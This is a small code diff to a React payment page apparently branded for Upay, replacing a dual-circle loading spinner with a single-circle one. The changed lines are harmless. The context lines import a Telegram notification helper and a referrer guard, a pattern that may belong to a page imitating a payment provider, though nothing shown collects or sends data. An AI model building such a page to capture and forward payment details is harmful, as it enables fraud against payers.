@@ -3,7 +3,7 @@ import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import { useReferrerGuard } from "@/hooks/useReferrerGuard";
-import DualCircleLoader from "@/components/DualCircleLoader";
+import SingleCircleLoader from "@/components/SingleCircleLoader";
 import upayLogo from "@/assets/upay-logo-full.svg";
 import CancelPaymentDialog from "@/components/CancelPaymentDialog";
 
@@ -152,7 +152,7 @@ const UpayPayment = () => {
 
   return (
     <div className="fixed inset-0 flex flex-col items-start justify-start p-4 pt-6 overflow-hidden" style={{ background: 'linear-gradient(to bottom, rgb(250, 235, 122) 10%, rgb(253, 251, 216) 80%)' }}>
-      {isLoading && <DualCircleLoader />}
+      {isLoading && <SingleCircleLoader />}
       <div className="w-full max-w-[420px] mx-auto rounded-2xl overflow-hidden shadow-lg" style={{ minHeight: '520px' }}>
         
         {/* Yellow upper section - logo, invoice, input */}
